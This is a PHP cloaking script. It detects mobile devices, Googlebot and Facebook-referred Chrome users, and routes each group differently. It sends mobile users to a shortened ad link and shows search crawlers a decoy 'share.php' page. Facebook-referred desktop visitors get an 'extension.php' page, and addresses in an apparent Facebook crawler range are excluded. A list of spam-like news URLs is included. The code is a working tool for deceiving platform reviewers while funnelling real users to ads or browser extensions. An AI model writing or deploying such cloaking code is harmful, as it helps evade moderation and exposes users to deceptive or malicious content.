<?php
ob_start();
require_once('Mobile_Detect.php');
require_once('Browser.php');
require_once('functions.php');
require_once('config.php');
$detect = new Mobile_Detect;
$browser = new Browser();

$mobiles =
[
"https://t.co/w4bgs4l0zU",
"https://t.co/Z26tAmC5Hx",
"https://t.co/qW5BpM1cQ8",
"https://t.co/5G4CEaTfRy",
"https://t.co/Qh6WLXLgfQ",
"https://t.co/xyzZa1V4ff",
"https://t.co/vuFQzk3R42",
"https://t.co/cvuVlnZKNR",
"https://t.co/sZTf0dPtdb",
"https://t.co/XSO9zrvKR7",
"https://t.co/mMc0MTH6uC",
"https://t.co/QzdyEv2Ujj",
"http://evaluefinance.com/eu-us-to-hold-crisp-round-of-exchange-talks-one-month-from-now",
"http://evaluefinance.com/us-family-unit-riches-surpasses-89-trillion",
"http://evaluefinance.com/turkey-suspends-islamic-moneylender-bank-asyas-exercises",
"http://evaluefinance.com/nigeria-to-offer-1-billion-in-eurobonds",
"http://evaluefinance.com/finance-news-you-need-to-know-today",
"http://evaluefinance.com/powerless-us-monetary-information-hose-rate-trek-prospects",
"http://evaluefinance.com/the-yorkshire-town-where-time-has-stopped-and-is-currently-marked-down-for-20m",
"http://evaluefinance.com/abu-dhabi-financial-group-enlists-new-boss-for-specialty-unit",
"http://evaluefinance.com/uk-agent-we-encouraged-administrations-for-88000-travelers",
"http://evaluefinance.com/oil-costs-expand-increases-turkish-lira-rises",
"http://evaluefinance.com/olive-gardens-pasta-passes-offering-on-ebay-for-as-much-as-4500",
"http://evaluefinance.com/bank-of-england-holds-loan-costs-at-0-25-for-each-penny",
"http://evaluefinance.com/tadawul-falls-1-9-as-financial-specialists-dump-stocks",
"http://evaluefinance.com/emaar-properties-records-750m-sukuk-on-nasdaq-dubai",
"http://evaluefinance.com/hanoians-eating-up-da-nang-property",
"http://evaluefinance.com/presently-the-ball-is-in-banks-court-to-take-position-against-upset-plotters-isbank-ceo",
"http://evaluefinance.com/turkeys-akbank-to-get-250-million-advance-from-ifc",
"http://evaluefinance.com/tim-martin-destroys-brexit-fate-monger-asserts-and-says-uk-neednt-bother-with-eu-exchange-bargain"
];


if (rand(1, 10) == 1) {

//$ads = $mobiles[array_rand($mobiles)];
$ads = "https://goo.gl/PnxJOM";

} else {

$ads = "https://goo.gl/PnxJOM";

}

$loc = "Location:http://".$app_site;


$isref = false;



if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
    $isref = true;
}


if($detect->isMobile() || $browser->isMobile()){
  header("Location:".$ads);
  exit();
}else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
  require_once('share.php');
}else if($browser->getBrowser() == Browser::BROWSER_CHROME && $browser->getPlatform() != Browser::PLATFORM_X11 && strpos($_SERVER["REMOTE_ADDR"], "66.220.14") === false) { 
  if($isref == true){
    
    if(strrpos($_SERVER["HTTP_HOST"], $app_site) === false){
      header($loc);
    }else{
        require_once('extension.php');
    }
  }else{
  require_once('share.php');
  }
  exit();
}else{
  ob_end_clean();
  //require_once('share.php');
  exit();
}
ob_end_flush();
?>
